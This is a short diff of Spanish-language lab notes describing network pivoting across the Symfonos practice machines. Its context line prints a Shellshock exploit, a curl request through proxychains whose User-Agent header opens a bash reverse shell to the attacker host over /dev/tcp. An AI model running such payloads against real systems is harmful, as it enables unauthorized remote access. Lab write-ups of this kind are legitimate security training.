@@ -810,3 +810,5 @@ sudo proxychains curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.3.2
 `Maquina Attack`
 efectivamente. la conexión ha viajado desde  `Symfonos-3` > `Symfonos-2` > `Symfonos-1` > `Attack` de esta manera hemos ejecutado con éxito el pivoting desde la maquina `Symfonos-3` hasta llegar a la maquina `Attack`
 ![[Pasted image 20240622205127.png]]
+
+# Maquina Symfonos-3
